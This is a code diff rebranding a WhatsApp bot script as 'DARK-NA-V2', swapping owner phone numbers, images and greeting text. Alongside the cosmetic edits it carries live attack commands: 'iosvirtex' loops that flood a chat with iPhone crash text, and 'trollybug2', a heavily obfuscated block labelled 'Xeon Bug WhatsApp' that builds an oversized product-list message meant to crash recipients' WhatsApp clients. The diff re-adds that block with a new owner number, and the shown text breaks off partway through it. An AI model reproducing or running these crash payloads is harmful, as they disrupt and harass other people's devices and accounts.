@@ -41,22 +41,22 @@ const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
 const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
 const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
  if(time2 < "23:59:00"){
-var ucapanWaktu = `*Good Night* 🌌`
+var ucapanWaktu = `Good Night 🌌`
  }
  if(time2 < "19:00:00"){
-var ucapanWaktu = `*Good Evening* 🌃`
+var ucapanWaktu = `Good Evening 🌃`
  }
  if(time2 < "18:00:00"){
-var ucapanWaktu = `*Good Evening* 🌃`
+var ucapanWaktu = `Good Evening 🌃`
  }
  if(time2 < "15:00:00"){
-var ucapanWaktu = `*Good Afternoon* 🌅`
+var ucapanWaktu = `Good Afternoon 🌅`
  }
  if(time2 < "11:00:00"){
-var ucapanWaktu = `*Good Morning* 🌄`
+var ucapanWaktu = `Good Morning 🌄`
  }
  if(time2 < "05:00:00"){
-var ucapanWaktu = `*Good Morning* 🌄`
+var ucapanWaktu = `Good Morning 🌄`
  } 
  
 // read database game
@@ -243,7 +243,7 @@ antilink: false,
             if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
 	    if (setting) {
 		if (!isNumber(setting.status)) setting.status = 0
-		if (!('autobio' in setting)) setting.autobio = true
+		if (!('autobio' in setting)) setting.autobio = false
 		if (!('templateImage' in setting)) setting.templateImage = true
 		if (!('templateVideo' in setting)) setting.templateVideo = false
 		if (!('templateGif' in setting)) setting.templateGif = false
@@ -275,11 +275,11 @@ return Math.floor(Math.random() * angka) + 1
 const hsjdh = randomNomor(5)
 
 //auto react all message
-/////XeonBotInc.sendMessage(m.chat, {
-          ////react: {
-            ////////////////////////////////////////text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
-            ////key: m.key,
-          /////}})
+// XeonBotInc.sendMessage(m.chat, {
+//           react: {
+//             text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
+//             key: m.key,
+//           }})
 
 //auto recording all
     if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
@@ -348,7 +348,7 @@ detectLinks: false,
     //reply fake
 	//group target \\
 const reply = (teks) => {
-           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
+           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/th.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
         }
 
 	//button
@@ -1920,6 +1920,7 @@ if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
                     {buttonId: `playmp3 ${anulay.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                     {buttonId: `playmp4 ${anulay.url}`, buttonText: {displayText: '► Video'}, type: 1}
                 ]
+
                 let buttonMessage = {
                     image: { url: anulay.thumbnail },
                     caption: `
@@ -1934,13 +1935,13 @@ ${themeemoji} Channel : ${anulay.author.url}
 ${themeemoji} Description : ${anulay.description}
 ${themeemoji} Url : ${anulay.url}`,
                     footer: botname,
-                    buttons: buttons,
+                    //buttons: buttons,
                     headerType: 4
                 }
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'playmp3': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
+case 'audio': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
 if (!text) throw `Example : ${prefix + command} anime whatsapp status`
 const xeonplaymp3 = require('./lib/ytdl2')
 let yts = require("youtube-yts")
@@ -1964,7 +1965,7 @@ await XeonBotInc.sendMessage(m.chat,{
 },{quoted:m})
 await fs.unlinkSync(pl.path)
 break
-case 'playmp4': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
+case 'video2': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
 if(!text) throw `Example : ${prefix + command} anime whatsapp status`
 const xeonplaymp4 = require('./lib/ytdl2')
 let ytsmp4 = require("youtube-yts")
@@ -3274,7 +3275,11 @@ m.reply(`There are no users who have rented bot yet`)
 }
 break
 case 'git': case 'gitclone':
-if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
+if (!args[0]) return m.reply(`bot git link
+https://github.com/acedemy/DARK-NA-V2
+my Whatsapp nomber
+
+94756224020 `)
 if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
@@ -3431,7 +3436,7 @@ View list of Messages With ${prefix}listmsg`)
             }
 	    break
 case 'developer': case 'dev': {
-reply(`•CHEEMS BOT DEVELOPER•\n\n\n   ©2021-2022 Xeon Bot Inc.\n\n🦄Dream Guy Xeon\nPm: wa.me/916909137213`)
+reply(`•DARK-NA BOT DEVELOPER•\n\n\n   ©2022-2023 Nilambara\n\n🦄Nilambara\nPm: wa.me/94756224020`)
 }
             break
 case 'owner': case 'creator': case 'moderator': case 'mod': {
@@ -6292,24 +6297,24 @@ const reply = `
     }
     break
 case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
-teks = `*「 ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nDont forget to donate 🍜`
+teks = `*「 DARK-NA-V2 Script 」*\n\nYouTube: https://www.youtube.com/channel/UCBbXJI6DPbmXDuWkHk819pw\nGitHub: ${global.botscript}\n\nDont forget to donate 🍜`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'Owner 🌺'}, type: 1}
 ]
 let buttonMessage = {
-image: {url: `https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg`},
+image: {url: `https://i.ibb.co/CwzQXqD/th.jpg`},
 jpegThumbnail: log0,
 caption: teks,
 footer: `${botname}`,
-buttons: buttons,
+//buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
 title:"I deserve something for my hardwork",
 body: "Click to donate", 
-thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
+thumbnail: fs.readFileSync("XeonMedia/theme/th.jpg"),
 mediaType:1,
-mediaUrl: 'https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg',
-sourceUrl: "https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg"
+mediaUrl: 'https://i.ibb.co/CwzQXqD/th.jpg',
+sourceUrl: "https://i.ibb.co/CwzQXqD/th.jpg"
 }}
 }
 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
@@ -6569,7 +6574,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "retailerId": author,
 "url": websitex
 },
-"businessOwnerJid": "916909137213@s.whatsapp.net",
+"businessOwnerJid": "94756224020@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: xeontalog })
 XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -7195,7 +7200,7 @@ case 'iosvirtex': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/CwzQXqD/th.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
 }
 }
 break
@@ -7205,7 +7210,7 @@ case 'iosvirtex5': {
 if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/CwzQXqD/th.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
 }
 }
 break
@@ -7296,7 +7301,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "retailerId": wm,
 "url": websitex
 },
-"businessOwnerJid": "916909137213@s.whatsapp.net",
+"businessOwnerJid": "94756224020@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
 XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -7309,7 +7314,7 @@ case 'trollybug2': {
                 if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await XeonBotInc[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});XeonBotInc['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
+function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 94756224020@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await XeonBotInc[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'